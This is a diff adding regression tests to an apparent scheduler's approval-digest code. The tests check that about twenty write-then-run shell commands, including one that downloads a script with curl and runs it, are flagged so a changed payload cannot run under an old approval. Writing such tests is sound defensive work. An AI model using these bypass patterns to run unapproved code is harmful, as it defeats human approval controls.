@@ -810,3 +810,69 @@ test('runCheck still runs what it is given, as the gate is the scheduler\'s', as
   const r = await runCheck({ command: 'echo hi', cwd: dir, home: dir, scheduleId: 's' });
   assert.deepEqual(r, { ok: true, output: 'hi' });
 });
+
+// Daybreak 153 (21 Nov 2026): a check that writes a file and then runs it.
+// `cp payload.dat run.sh; sh run.sh` hashed run.sh as it was and not the
+// payload, so changing only the payload ran it once, unasked, with the
+// approval's digest unchanged. A check that writes what it (or a script it
+// reaches) runs, sources or loads can't be followed: it fails closed, so a
+// card approves it each time rather than once.
+test('schedule check: one that writes a file it then runs is unfollowable, so a payload-only change never runs under an old approval', () => {
+  const files = { 'payload.dat': 'echo safe\n', 'run.sh': '#!/bin/sh\necho old\n', 'lib/env.sh': 'X=1\n', 'tools/a.mjs': '1;\n' };
+  const writes = [
+    // The finding's three.
+    'cp payload.dat run.sh; sh run.sh',
+    'cat payload.dat > run.sh; sh run.sh',
+    'cat payload.dat | tee run.sh >/dev/null; ./run.sh',
+    // And the same by other routes: append, clobber, a folder copy, mv,
+    // a link, dd, sed -i, curl, sourcing and loading, a later script.
+    'cat payload.dat >> run.sh && ./run.sh',
+    'cat payload.dat >| run.sh; bash ./run.sh',
+    'cp -R payload-dir/. lib/; . ./lib/env.sh',
+    'mv payload.dat run.sh; ./run.sh',
+    'ln -sf payload.dat run.sh; ./run.sh',
+    'dd if=payload.dat of=run.sh 2>/dev/null; ./run.sh',
+    "sed -i '' -e 's/old/new/' run.sh; ./run.sh",
+    'curl -so run.sh https://example.com/x; ./run.sh',
+    'cp payload.dat tools/a.mjs; node tools/a.mjs',
+    'command cp payload.dat run.sh; ./run.sh',
+    'cp -t . payload.dat; ./run.sh',
+    './run.sh; cp payload.dat run.sh',
+    // Where it writes is worked out as it runs, or by the data itself.
+    'f=$(cat target.txt); cp payload.dat "$f"; ./run.sh',
+    'git checkout -q other -- .; ./run.sh',
+    'tar -xf payload.tar; ./run.sh',
+    'unzip -o payload.zip; ./run.sh',
+    'patch -p1 < payload.diff; ./run.sh',
+    "awk '{ print > \"run.sh\" }' payload.dat; ./run.sh",
+  ];
+  for (const check of writes) {
+    const dir = repo({ ...files, 'payload-dir/env.sh': 'X=2\n', 'target.txt': 'run.sh\n' });
+    const d = checkDigest(check, dir);
+    assert.match(d.problem ?? '', /writes/, check);
+  }
+  // The finding's attack, played: a payload-only change after approval.
+  // Before this, the digest stayed the same and the shell ran the payload.
+  const dir = repo(files);
+  const approved = checkDigest('cp payload.dat run.sh; sh run.sh', dir);
+  fs.writeFileSync(path.join(dir, 'payload.dat'), 'touch pwned\n');
+  const now = checkDigest('cp payload.dat run.sh; sh run.sh', dir);
+  assert.ok(approved.problem && now.problem, 'unfollowable either way, so it asks each time');
+  // A script the check runs is held the same way.
+  const deep = repo({ ...files, 'check.sh': '#!/bin/sh\ncp "$(dirname "$0")/payload.dat" "$(dirname "$0")/run.sh"\n"$(dirname "$0")/run.sh"\n' });
+  assert.match(checkDigest('./check.sh', deep).problem ?? '', /writes run\.sh/);
+});
+
+test('schedule check: writing files it never runs stays followable: state files, logs, temp files, /dev/null', () => {
+  const dir = repo({ 'run.sh': '#!/bin/sh\necho hi\n', 'payload.dat': 'x\n' });
+  for (const check of [
+    './run.sh > out.log 2>&1',
+    './run.sh >/dev/null 2>&1; echo done >&2',
+    'echo "$(./run.sh)" > "$THREADBEAR_CHECK_STATE"',
+    './run.sh | tee -a state.txt',
+    't=$(mktemp); ./run.sh > "$t"; cat "$t"; rm -f "$t"',
+    'cp payload.dat backup.dat; ./run.sh',
+    'git fetch -q origin 2>/dev/null; ./run.sh',
+    'git pull -q',
+  ]) assert.equal(checkDigest(check, dir).problem, undefined, check);
+});
